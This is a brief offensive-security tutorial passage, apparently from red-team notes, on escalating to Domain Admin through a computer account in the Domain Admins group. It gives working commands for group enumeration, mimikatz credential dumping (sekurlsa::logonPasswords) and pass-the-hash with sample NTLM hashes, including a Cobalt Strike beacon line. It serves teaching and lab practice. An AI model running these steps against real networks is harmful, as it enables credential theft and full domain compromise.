
Let's assume WS01$ is a member of `Domain Admins` group - congratulations, you are one step away from escalating from local admin to Domain Admin and a full domain compromise.
## Execution
Finding domain computers that are members of interesting groups:

```
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
```
![[image 16.avif]]
```
net group "domain admins" /domain
```
![[image 23.png]]
Extracting the machine `WS01$` NTLM hash after the admin privileges were gained on the system:

```
sekurlsa::logonPasswords
```
Since WS01$ machine is a member of Domain Admins and we have extracted the machine's hash with mimikatz, we can use mimikatz to pass that hash and effectively elevate our access to Domain Admin:
```
sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861

or

beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
```

